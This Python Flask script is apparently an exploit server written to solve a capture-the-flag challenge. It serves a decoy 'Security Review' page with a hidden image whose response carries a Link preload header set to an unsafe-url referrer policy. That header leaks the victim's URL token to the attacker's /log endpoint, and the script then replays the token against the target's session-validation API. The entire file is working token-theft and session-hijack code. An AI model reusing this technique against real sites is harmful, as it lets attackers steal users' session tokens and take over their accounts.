#!/usr/bin/env python3

from flask import Flask, request, Response
import requests
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)

VICTIM_URL = "https://cars.chalz.nitectf25.live"

@app.route('/exploit')
def exploit():
    leak_url = request.url_root.rstrip('/') + '/leak.png'
    
    html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Security Report</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Security Review in Progress</h1>
    <p>Analyzing submitted content...</p>
    <img src="{leak_url}" style="display:none" id="leak-img">
</body>
</html>'''
    
    return Response(html, mimetype='text/html')


@app.route('/leak.png')
def leak():
    png = (b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
           b'\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\xf8\x0f'
           b'\x00\x01\x01\x01\x00\x18\xdd\x03\xdb\x00\x00\x00\x00IEND\xaeB`\x82')
    
    resp = Response(png, mimetype='image/png')
    
    log_url = request.url_root.rstrip('/') + '/log'
    resp.headers['Link'] = (
        f'<{log_url}>; rel="preload"; as="image"; '
        'referrerpolicy="unsafe-url"'
    )
    
    return resp


@app.route('/log')
def log():
    referrer = request.headers.get('Referer') or request.headers.get('Referrer')
    
    if referrer and 'token=' in referrer:
        parsed = urlparse(referrer)
        token_list = parse_qs(parsed.query).get('token', [])
        
        if token_list:
            token = token_list[0]
            print(f"TOKEN: {token}")
            try:
                r = requests.post(
                    f"{VICTIM_URL}/auth/session/validate",
                    json={"token": token},
                    timeout=5
                )
                if r.status_code == 200:
                    data = r.json()
                    print(f"FLAG: {data.get('flag')}")
                else:
                    print(f" Validation Failed: {r.status_code}")
                    print(f" Response: {r.text}")
            except Exception as e:
                print(f"Exception: {e}")
    
    return 'logged', 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
